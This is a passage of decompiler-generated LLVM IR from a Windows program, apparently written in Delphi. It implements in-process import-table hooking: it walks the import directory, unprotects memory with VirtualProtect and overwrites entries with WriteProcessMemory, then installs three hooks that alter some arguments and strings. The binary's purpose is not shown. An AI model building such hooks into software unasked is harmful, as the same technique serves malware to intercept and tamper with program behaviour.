  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1963
  %3 = sext i1 %2 to i32, !insn.addr !1963
  ret i32 %3, !insn.addr !1964
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1965
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1965
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1965
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1966
  %2 = load i32, i32* @global_var_40a6e4, align 4, !insn.addr !1967
  %3 = add i32 %2, 1, !insn.addr !1967
  store i32 %3, i32* @global_var_40a6e4, align 4, !insn.addr !1967
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1968
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1969
  ret i32 0, !insn.addr !1970
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1971
  ret i32 %0, !insn.addr !1971
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1972
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1973
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6e4, align 4, !insn.addr !1974
  %2 = add i32 %1, -1, !insn.addr !1974
  store i32 %2, i32* @global_var_40a6e4, align 4, !insn.addr !1974
  ret i32 %0, !insn.addr !1975
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1976
  ret i32* %0, !insn.addr !1976
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1977
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1977
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1977
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1978
  %2 = load i32, i32* @global_var_40a6ec, align 4, !insn.addr !1979
  %3 = add i32 %2, 1, !insn.addr !1979
  store i32 %3, i32* @global_var_40a6ec, align 4, !insn.addr !1979
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1980
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1981
  ret i32 0, !insn.addr !1982
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1983
  ret i32 %0, !insn.addr !1983
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1984
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1985
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6ec, align 4, !insn.addr !1986
  %2 = add i32 %1, -1, !insn.addr !1986
  store i32 %2, i32* @global_var_40a6ec, align 4, !insn.addr !1986
  ret i32 %0, !insn.addr !1987
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1988
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1988
  %eax.0.reg2mem = alloca i32, !insn.addr !1988
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1989
  %7 = icmp eq i8 %6, 0, !insn.addr !1989
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1990
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1990

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1991
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1991
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1991
  br label %dec_label_pc_407673, !insn.addr !1991

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1992
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1993
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1993
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1993
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1994
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1994
  store i32 %13, i32* %15, align 4, !insn.addr !1994
  %16 = icmp eq i32* %12, null, !insn.addr !1995
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1996
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !1996

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1997
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1998
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1998
  store i32 %17, i32* %19, align 4, !insn.addr !1998
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1999
  %21 = add i32 %eax.0.reload, 16, !insn.addr !2000
  %22 = inttoptr i32 %21 to i32*, !insn.addr !2000
  store i32 %20, i32* %22, align 4, !insn.addr !2000
  %23 = add i32 %eax.0.reload, 20, !insn.addr !2001
  %24 = inttoptr i32 %23 to i32*, !insn.addr !2001
  store i32 %arg3, i32* %24, align 4, !insn.addr !2001
  %25 = load i32, i32* %22, align 4, !insn.addr !2002
  %26 = add i32 %esp.0, -8, !insn.addr !2003
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2003
  store i32 %25, i32* %27, align 4, !insn.addr !2003
  %28 = add i32 %esp.0, -12, !insn.addr !2004
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2004
  store i32 %17, i32* %29, align 4, !insn.addr !2004
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2005
  %31 = ptrtoint i32* %30 to i32, !insn.addr !2005
  %32 = add i32 %esp.0, -16, !insn.addr !2006
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2006
  store i32 %31, i32* %33, align 4, !insn.addr !2006
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2007
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !2007
  %36 = add i32 %eax.0.reload, 24, !insn.addr !2008
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2008
  store i32 %35, i32* %37, align 4, !insn.addr !2008
  %38 = icmp eq i32 ()* %34, null, !insn.addr !2009
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !2010
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !2010

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !2011
  %40 = add i32 %esp.0, -20, !insn.addr !2012
  %41 = inttoptr i32 %40 to i32*, !insn.addr !2012
  store i32 %39, i32* %41, align 4, !insn.addr !2012
  %42 = load i32, i32* %15, align 4, !insn.addr !2013
  %43 = add i32 %esp.0, -24, !insn.addr !2014
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2014
  store i32 %42, i32* %44, align 4, !insn.addr !2014
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2015
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2015
  br label %dec_label_pc_4076cb, !insn.addr !2015

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !2016

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2017
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2018
  %48 = load i32, i32* %47, align 4, !insn.addr !2018
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2018
  br label %dec_label_pc_4076e2, !insn.addr !2019

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2020
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2020
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1992
  ret i32 %eax.0.reload, !insn.addr !2021
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !2022
  %eax.0.reg2mem = alloca i32, !insn.addr !2022
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2023
  %4 = add i32 %3, 8, !insn.addr !2024
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2024
  %6 = load i32, i32* %5, align 4, !insn.addr !2024
  %7 = icmp eq i32 %6, 0, !insn.addr !2024
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2025
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !2025

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !2026
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2026
  %10 = load i32, i32* %9, align 4, !insn.addr !2026
  %11 = icmp eq i32 %10, 0, !insn.addr !2026
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2027
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !2027

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !2028
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2028
  %14 = load i32, i32* %13, align 4, !insn.addr !2028
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2029
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2030
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2030
  %18 = load i32, i32* %5, align 4, !insn.addr !2031
  %19 = icmp eq i32 %18, %17, !insn.addr !2031
  %20 = icmp eq i1 %19, false, !insn.addr !2032
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2032
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !2032

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !2033
  %22 = call i32 @function_407734(i32 %21), !insn.addr !2034
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2034
  br label %dec_label_pc_407726, !insn.addr !2034

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2035
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2036
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !2036

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2037
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2037
  br label %dec_label_pc_407731, !insn.addr !2037

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2038
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !2039
  %esp.0.reg2mem = alloca i32, !insn.addr !2039
  %storemerge6.reg2mem = alloca i32, !insn.addr !2039
  %.reg2mem14 = alloca i32, !insn.addr !2039
  %esp.17.reg2mem = alloca i32, !insn.addr !2039
  %esi.08.reg2mem = alloca i32, !insn.addr !2039
  %.reg2mem = alloca i32, !insn.addr !2039
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2040
  %4 = icmp eq i1 %3, false, !insn.addr !2041
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2042
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !2041

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !2043
  %7 = trunc i32 %1 to i8, !insn.addr !2044
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2045
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2046
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2046
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2046
  %11 = icmp eq i32* %9, null, !insn.addr !2047
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2048
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !2048

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !2049
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2049
  %14 = load i32, i32* %13, align 4, !insn.addr !2049
  %15 = icmp eq i32 %14, 0, !insn.addr !2050
  %16 = icmp eq i1 %15, false, !insn.addr !2051
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2051
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !2051

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2045
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2052
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2053
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2054
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2054
  store i32 %18, i32* %25, align 4, !insn.addr !2054
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2055
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2055
  store i32 %23, i32* %27, align 4, !insn.addr !2055
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2056
  %29 = icmp eq i32 %28, 0, !insn.addr !2057
  %30 = icmp eq i1 %29, false, !insn.addr !2058
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2058
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2058

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2059
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2059
  %33 = load i32, i32* %32, align 4, !insn.addr !2059
  %34 = add i32 %33, %arg1, !insn.addr !2060
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2061
  %36 = load i32, i32* %35, align 4, !insn.addr !2061
  %37 = icmp eq i32 %36, 0, !insn.addr !2062
  %38 = icmp eq i1 %37, false, !insn.addr !2063
  store i32 %36, i32* %.reg2mem14, !insn.addr !2063
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2063
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2063
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2063

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2064
  %40 = icmp eq i1 %39, false, !insn.addr !2065
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2065

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2066
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2066
  store i32 %20, i32* %42, align 4, !insn.addr !2066
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2067
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2067
  store i32 128, i32* %44, align 4, !insn.addr !2067
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2068
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2068
  store i32 4, i32* %46, align 4, !insn.addr !2068
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2069
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2069
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2069
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2070
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2071
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2071
  store i32 %21, i32* %51, align 4, !insn.addr !2071
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2072
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2072
  store i32 4, i32* %53, align 4, !insn.addr !2072
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2073
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2073
  store i32 %22, i32* %55, align 4, !insn.addr !2073
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2074
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2074
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2074
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2075
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2075
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2076
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2076
  store i32 %59, i32* %61, align 4, !insn.addr !2076
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2077
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2078
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2078
  store i32 %21, i32* %64, align 4, !insn.addr !2078
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2079
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2080
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2080
  store i32 %65, i32* %67, align 4, !insn.addr !2080
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2081
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2081
  store i32 4, i32* %69, align 4, !insn.addr !2081
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2082
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2082
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2082
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2083
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2084
  br label %dec_label_pc_4077d7, !insn.addr !2084

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2085
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2061
  %75 = load i32, i32* %74, align 4, !insn.addr !2061
  %76 = icmp eq i32 %75, 0, !insn.addr !2062
  %77 = icmp eq i1 %76, false, !insn.addr !2063
  store i32 %75, i32* %.reg2mem14, !insn.addr !2063
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2063
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2063
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2063

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2086
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2049
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2049
  %81 = load i32, i32* %80, align 4, !insn.addr !2049
  %82 = icmp eq i32 %81, 0, !insn.addr !2050
  %83 = icmp eq i1 %82, false, !insn.addr !2051
  store i32 %81, i32* %.reg2mem, !insn.addr !2051
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2051
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2051
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2051
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !2051

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2087
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2088
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2088
  %3 = load i32, i32* %2, align 4, !insn.addr !2088
  ret i32 %3, !insn.addr !2089
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2090
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2090
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2090
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2091
  %2 = load i32, i32* @global_var_40a6f0, align 4, !insn.addr !2092
  %3 = add i32 %2, 1, !insn.addr !2092
  store i32 %3, i32* @global_var_40a6f0, align 4, !insn.addr !2092
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2093
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2094
  ret i32 0, !insn.addr !2095
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2096
  ret i32 %0, !insn.addr !2096
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2097
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2098
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6f0, align 4, !insn.addr !2099
  %2 = add i32 %1, -1, !insn.addr !2099
  store i32 %2, i32* @global_var_40a6f0, align 4, !insn.addr !2099
  ret i32 %0, !insn.addr !2100
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2101
  ret i32 %3, !insn.addr !2102
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2103
  %2 = icmp eq i1 %1, false, !insn.addr !2104
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2105
  ret i32 %3, !insn.addr !2106
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2107
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2107
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2107
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2108
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2109
  %3 = call i32 @"@LStrPos"(), !insn.addr !2110
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2111
  %6 = call i32 @"@LStrPos"(), !insn.addr !2112
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2113
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2114
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2115
  ret i32 %9, !insn.addr !2116
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2117
  ret i32 %0, !insn.addr !2117
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2118
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2119
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2120
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2121
  store i32 %0, i32* @global_var_40910c, align 4, !insn.addr !2122
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2123
  store i32 %1, i32* @global_var_409110, align 4, !insn.addr !2124
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2125
  store i32 %2, i32* @global_var_409114, align 4, !insn.addr !2126
  ret i32 %2, !insn.addr !2127
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
